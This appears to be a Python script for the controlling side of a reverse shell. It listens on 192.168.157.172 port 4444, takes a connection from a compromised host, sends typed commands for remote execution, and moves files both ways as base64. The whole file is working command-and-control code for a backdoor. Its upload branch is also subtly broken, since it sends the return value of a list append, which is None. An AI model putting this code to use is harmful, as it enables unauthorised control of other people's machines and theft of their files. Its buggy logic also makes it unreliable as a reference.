import socket, json, base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for a connection")
        self.connection, address = listener.accept()
        print(f"[+] Got connection from {str(address)}")

    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_rcv()
    
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())
        return
    
    def reliable_rcv(self):
        json_data= ''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf8', 'replace')
                return json.loads(json_data)
            except ValueError:
                continue

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(content)
            return '[+] Download Successful'
        
    def read_file(self, path):
        with open(path, "rb") as file:
            return (base64.b64encode(file.read())).decode()


    def run(self):
        while True:
            command = input(">> ")
            command = command.split(' ')
            if command[0] == 'exit':
                self.reliable_send(command)
                self.connection.close()
                exit()

            if command[0] == 'upload':
                path = command[1]
                content = self.read_file(path)
                self.reliable_send(command.append(content))

            result = self.execute_remotely(command)

            if command[0] == "download":
                path = command[1]
                result = base64.b64decode(result)
                result = self.write_file(path, result)
                
            print(result)


my_listener = Listener('192.168.157.172', 4444)
my_listener.run()
